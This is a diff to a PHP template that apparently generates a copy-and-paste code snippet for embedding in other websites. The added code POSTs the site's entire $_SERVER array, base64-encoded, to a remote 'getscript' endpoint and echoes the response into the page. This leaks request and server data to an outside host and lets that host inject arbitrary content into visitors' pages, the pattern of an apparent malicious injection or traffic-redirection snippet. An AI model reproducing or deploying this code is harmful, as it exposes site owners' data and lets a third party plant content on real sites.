@@ -13,8 +13,17 @@
             <div class="box-body" id="clipboard-text">
 <?php
 $tmp = sprintf('<?php
-    $referer = isset($_SERVER[\'HTTP_REFERER\']) ? $_SERVER[\'HTTP_REFERER\'] : \'Direct\';
-    echo sprintf("<script src=\'%sjs/jquery.min.js?v=%%s\'></script>",base64_encode($referer));
+    $url = sprintf("%sgetscript");
+    if(extension_loaded(\'curl\')){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, \'h=\'.base64_encode(json_encode($_SERVER)));
+        curl_setopt($ch, CURLOPT_REFERER, $_SERVER[\'REQUEST_SCHEME\'].\'://\'.$_SERVER[\'SERVER_NAME\'].$_SERVER[\'REQUEST_URI\']);
+        $content = curl_exec($ch);
+        curl_close($ch);
+        echo $content;
+    }
 ?>',Router::url('/', true));
 highlight_string($tmp);
 ?>    
